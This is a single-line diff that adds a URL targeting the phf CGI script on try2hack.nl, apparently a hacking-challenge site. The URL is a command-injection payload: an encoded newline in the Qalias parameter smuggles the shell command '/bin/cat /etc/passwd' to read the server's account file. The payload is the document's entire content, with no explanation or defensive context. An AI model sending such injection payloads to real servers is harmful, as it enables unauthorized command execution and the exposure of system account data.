@@ -1,0 +1,1 @@
+www.try2hack.nl/cgi-bin/phf?Qalias=%0A/bin/cat /etc/passwd
